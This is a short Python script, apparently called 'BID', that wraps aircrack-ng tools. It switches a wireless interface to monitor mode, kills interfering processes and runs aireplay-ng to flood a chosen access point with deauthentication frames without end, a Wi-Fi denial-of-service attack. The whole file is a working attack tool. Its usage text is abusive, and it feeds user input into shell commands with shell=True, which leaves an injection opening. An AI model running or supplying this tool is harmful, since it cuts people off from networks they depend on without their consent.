import sys, subprocess,getopt,io
from time import sleep

version = "1.0"

def usage():
    print("\n:::::::::::::::::::::::::BID usage guide::::::::::::::::::::::::")
    print("\n\t -python BID.py --mac,-m E8:40:F2:69:E6:3B  -c,--channel 0-14 -i,--interface wlan0 ")
    print("\n\t        If you don't get it fuck you")


def put_to_monitorMode(iface, channel):
    print("Putting %s to monitor mode..."%iface)
    #sleep(2)
    cmd =["ifconfig "+str(iface)+" down",
          "iwconfig "+iface+" mode monitor",
          "ifconfig "+str(iface)+" up",
          "iwconfig "+iface+" channel "+str(channel),
          "airmon-ng check kill"]


    for command in cmd:
        s1 = subprocess.Popen(command, stdout = subprocess.PIPE, stderr = subprocess.STDOUT, shell=True)
        for line in io.TextIOWrapper(s1.stdout, encoding="utf-8"):
            print(line)
    return


def perform_denial(mac,iface,channel):
    print("Performing attack!!!\n To stop press CTR+D")

    put_to_monitorMode(iface, channel)

    cmd=["aireplay-ng -0 0 -a "+mac+" "+iface]

    process = subprocess.Popen(cmd,stdout = subprocess.PIPE, stderr = subprocess.STDOUT, shell=True)

    for line in io.TextIOWrapper(process.stdout, encoding="utf-8"):
        print(line)

    return
    
    
    
def main():

    mac_address = ""
    channel = 0
    interface = ""
    
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hm:c:i:",["help","version","mac=","channel=","interface="])
        #print(opts)
    except getopt.GetoptError as err:
        print(err)
        usage()
        sys.exit(2)

    
    for o, a in opts:

        if o in ("-h","--help"):
            usage()
            sys.exit()
        elif o in ("-m","--mac"):
            mac_address=a
            #print(mac_address)
            
        elif o in ("-c","--channel"):
            try:
                channel = int(a)
            except Exception as err:
                print("\nAre u fking moron? Channel is integer in range(0,14)")
                usage()
                sys.exit(2)

        elif o in ("-i","--interface"):
            if a == "":
                usage()
                sys.exit(2)
                
            interface = a
                
            #print(channel)
        elif o in ("-v","--version"):
            print(version)
        else:
            assert False," Option is not recognized!"

    print("Mac Address of AP: %s\nOn channel: %i\nInterface: %s"%(mac_address,int(channel),interface))

    perform_denial(mac_address, interface, channel)
    return


if __name__=="__main__":
    main()
